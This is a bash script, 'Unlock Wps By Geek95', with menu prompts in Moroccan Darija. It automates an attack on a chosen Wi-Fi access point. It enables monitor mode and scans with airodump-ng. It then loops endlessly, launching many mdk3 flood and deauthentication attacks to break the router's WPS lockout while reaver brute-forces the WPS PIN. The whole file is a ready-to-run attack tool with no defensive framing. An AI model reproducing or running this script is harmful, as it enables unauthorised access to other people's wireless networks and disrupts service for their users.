#!/bin/bash
#Unlocked wps
#By Ayoub Tachdirte
#Contact : https://www.facebook.com/Ayoub.Tac
menu () {
clear
#Color
cyan='\e[0;36m'
red='\e[1;31m'
yellow='\e[1;33m'
Green1='\033[1;32m'
NC='\033[0m'
LightGreen='\033[1;32m'
Blue='\033[1;34m'
Green='\033[0;32m'
Red='\033[1;31m'
echo -e $cyan "
                     ▒█▀▀█ █▀▀ █▀▀ █░█ ▄▀▀▄ █▀▀ 
                     ▒█░▄▄ █▀▀ █▀▀ █▀▄ ▀▄▄█ ▀▀▄ 
                     ▒█▄▄█ ▀▀▀ ▀▀▀ ▀░▀ ░▄▄▀ ▄▄▀ 	"
echo ""
echo -e ${yellow} "                https://www.facebook.com/Ayoub.Tac"

echo -e $Green'                        .-  _           _  -.
                       /   /             \   \
                      (   (  (  (-X-)  )  )   )
                       \   \_           _/   /
                         -                 -'
echo ""    
echo -e $Green'                     Unlock Wps By Geek95 v1.1'
echo ""
echo -e $red'  3zel Acheno Bghiti Dir :'
echo ""
echo -e $Blue"       ${cyan}1${yellow}) ${Blue}Bghiti tbda mén lawel o tejbed ${Green}BSSID & ESSID & l3aybat${NC} ${Blue}dyal l'wifi."
echo -e       "       ${cyan}2${yellow}) ${Blue}3ndek ${Green}BSSID o l3aybat${NC} ${Blue}o bghiti t7el ${Green}Wps${NC} $Blue."
echo ""
echo -n -e $red'  \033[4mKtéb Ach Bghiti Dir:\033[0m >> '; tput sgr0
read choice
case $choice in
1)scan;;
2)attack;;
esac
}
scan () {
printf "${cyan}Kteb ina Interface bache baghi Tkhdem ${Green}wlan0 ${cyan}olla ${Green}wlan1${NC} : "
read interface ;
monitors
echo -e ${Red} "'Mola7ada' ${NC}${Blue}ila bghiti t7bes ${Green}SCAN ${Blue}li ghadi itle3 lik daba ghadi dir ${NC} ${Green}Ctrl+C ${NC}${Blue}ila fhamti Cliquer 3la Enter :${NC}"
read click
echo "Red lbale l'had tablau li ghadi itla3 lik daba dyal scan o copier BSSID & ESSID & Channel Dyal l Wifi li baghi t7el lih l wps";
echo " Men ba3d 20 seconds ghadi terja3 l menu khtar ra9m (2) o dkhel les infos li 9ydeti dyal l'wifi li baghi t7el lih l wps ";
gnome-terminal -e "timeout 80s airodump-ng wlan0 ";
sleep 30s
menu
}
attack () {
printf "${cyan} Kteb ESSID ${yellow}: ${NC}"
read essid ;
printf "${cyan} Kteb BSSID ${yellow}: ${NC}"
read bssid ;
printf "${cyan} Kteb Channel ${yellow}: ${NC}"
read channel ;
while true
do
rm -f /reaverlog.txt
xterm -e timeout 70s mdk3 wlan0 a- "$bssid" -m &
xterm -e timeout 2m mdk3 wlan0 x 0 -t "$bssid" -n "$essid" -s 5500 &
xterm -e timeout 2m mdk3 wlan0 x 0 -t "$bssid" -n "$essid" -s 5500 &
xterm -e timeout 2m mdk3 wlan0 x 0 -t "$bssid" -n "$essid" -s 5500 &
xterm -e timeout 2m mdk3 wlan0 a -a "$essid" &
xterm -e timeout 2m mdk3 wlan0 d -c $channel  &
xterm -e timeout 2m mdk3 wlan0 d -c $channel  &
xterm -e timeout 2m mdk3 wlan0 d -c $channel &
xterm -e timeout 2m mdk3 wlan0 -b blacklist -t "$bssid" -c $channel X &
xterm -e timeout 2m mdk3 wlan0 -b blacklist -t "$bssid" -c $channel X &
xterm -e timeout 2m mdk3 wlan0 -b  -t "$bssid" -c $channel X &
xterm -e timeout 2m mdk3 wlan0 m -t "$bssid" &
xterm -e timeout 2m mdk3 wlan0 f -t "$bssid" -f 99:99:99 &
reaver -i wlan0 -b "$bssid" - c $channel -vv -P  >> /root/reaverlog.txt &
tail -f /root/reaverlog.txt &
if
tail -f /root/reaverlog.txt  | grep -q Timeout
then
killall reaver
killall tail
fi
killall airodump-ng &
sleep 3m
done
}
cleaner () { i="1";
while [ $i -lt 15 ];
do
airmon-ng stop wlan0$i >> /dev/null
i=$((i+1))
done }
monitors () {
echo -e $Green "[+] ${cyan}Starting Monitors...${NC}"
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
echo -e $Green "[+] ${cyan}Oky Done .${NC}";
}
menu
